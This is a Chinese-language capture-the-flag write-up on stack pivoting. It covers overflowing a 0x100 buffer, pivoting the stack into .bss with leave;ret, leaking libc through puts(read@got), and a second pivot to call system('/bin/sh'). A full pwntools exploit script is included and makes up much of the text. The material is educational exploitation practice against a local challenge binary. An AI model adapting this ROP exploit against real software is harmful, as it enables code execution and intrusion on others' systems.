# 栈迁移

## 题目简述

程序存在栈溢出，但当前栈帧能容纳的 ROP 链较短。二进制未开启 PIE，并提供可重复进入的读入代码、`pop rdi; ret`、`pop rbp; ret` 和 `leave; ret`。利用思路是把伪造栈写到空间更大的 `.bss`，再通过 `leave; ret` 同时修改 `rsp` 与 `rbp`。

本题中局部缓冲区大小为 `0x100`，关键地址为：

```text
.bss 伪造栈       0x404040 + 0x700
重新读入代码       0x4011d9
pop rdi; ret       0x4011c5
pop rbp; ret       0x40115d
leave; ret         0x4011f3
```

`leave` 等价于：

```asm
mov rsp, rbp
pop rbp
```

紧接的 `ret` 再从新 `rsp` 取出下一条指令地址，所以伪造栈的第一个八字节通常作为新 `rbp`，第二个八字节才是首个 ROP gadget。

## 解题过程

### 第一阶段：让下一次输入落入 .bss

重新读入代码以当前 `rbp - 0x100` 作为目标缓冲区。第一次溢出把保存的 `rbp` 改为 `bss + 0x100`，再返回到读入代码，于是下一次输入会写到：

```text
(bss + 0x100) - 0x100 = bss
```

对应 payload 为：

```python
payload1 = b"A" * 0x100 + p64(bss + 0x100) + p64(read_again)
```

这一步只负责改变后续读入位置，并未开始泄露 libc。

### 第二阶段：迁移到 .bss 并泄露 libc

第二段数据被写到 `bss`。其开头布置 ROP 链：用 `puts(read@got)` 泄露 libc 中 `read` 的真实地址，然后设置下一次 `rbp`，让第三段输入写到 `bss + 0x300`。

第二段末尾覆盖该伪栈帧的保存值：把保存的 `rbp` 设为 `bss - 8`，返回地址设为 `leave; ret`。执行后，`rsp` 被切换到 `bss - 8`；`pop rbp` 消耗 `bss - 8` 处的占位值，随后的 `ret` 恰好从 `bss` 取出第一个 gadget。

```python
payload2 = (
    p64(pop_rdi)
    + p64(elf.got["read"])
    + p64(elf.plt["puts"])
    + p64(pop_rbp)
    + p64(stage3 + 0x100)
    + p64(read_again)
).ljust(0x100, b"\x00")

payload2 += p64(bss - 8) + p64(leave_ret)
```

读取泄露值后计算 libc 基址：

```python
read_addr = u64(p.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
libc_base = read_addr - libc.sym["read"]
system = libc_base + libc.sym["system"]
bin_sh = libc_base + next(libc.search(b"/bin/sh\x00"))
```

### 第三阶段：第二次迁移并执行 system

第二阶段已经把 `rbp` 设为 `stage3 + 0x100`，重新进入读入代码后，第三段数据会写到 `stage3`。该段开头先放一个供 `leave` 消耗的新 `rbp` 占位值，再布置：

```text
pop rdi; ret → "/bin/sh" → ret → system
```

单独插入一个 `ret` 用于满足 AMD64 SysV 调用约定下的栈对齐。

完整利用脚本如下：

```python
from pwn import *


p = process("./pwn")
elf = ELF("./pwn")
libc = ELF("./libc.so.6")

bss = 0x404040 + 0x700
stage3 = bss + 0x300
read_again = 0x4011D9
pop_rdi = 0x4011C5
pop_rbp = 0x40115D
leave_ret = 0x4011F3
ret = pop_rdi + 1
offset = 0x100

p.recvuntil(b"game :)")

payload1 = b"A" * offset + p64(bss + offset) + p64(read_again)
p.send(payload1)

payload2 = (
    p64(pop_rdi)
    + p64(elf.got["read"])
    + p64(elf.plt["puts"])
    + p64(pop_rbp)
    + p64(stage3 + offset)
    + p64(read_again)
).ljust(offset, b"\x00")
payload2 += p64(bss - 8) + p64(leave_ret)
p.send(payload2)

read_addr = u64(p.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
libc_base = read_addr - libc.sym["read"]
system = libc_base + libc.sym["system"]
bin_sh = libc_base + next(libc.search(b"/bin/sh\x00"))

log.info(f"libc base: {libc_base:#x}")

payload3 = (
    p64(0)
    + p64(pop_rdi)
    + p64(bin_sh)
    + p64(ret)
    + p64(system)
).ljust(offset, b"\x00")
payload3 += p64(stage3) + p64(leave_ret)
p.send(payload3)

p.interactive()
```

第三段末尾令 `rbp=stage3` 并再次返回 `leave; ret`。这次 `leave` 把 `rsp` 指向 `stage3`，消费开头的 `p64(0)` 后，从 `pop rdi; ret` 开始执行，最终获得 shell。

## 方法总结

栈迁移的本质是把“保存的 `rbp`”变成下一块伪造栈的地址，再用 `leave; ret` 完成 `rsp` 切换。本题还利用读入代码以 `rbp-0x100` 为缓冲区这一特点，通过控制 `rbp` 决定下一段数据写到 `.bss` 的哪里。

调试时应为每个阶段画出 `rbp`、`rsp`、保存的 `rbp` 和返回地址：第一段只改写入位置，第二段泄露 libc 并安排第三段地址，第三段执行 ret2libc。若忽略 `leave` 自带的 `pop rbp`，ROP 链会整体错开八字节；若忽略 `system` 前的 16 字节栈对齐，则可能在 libc 内部崩溃。
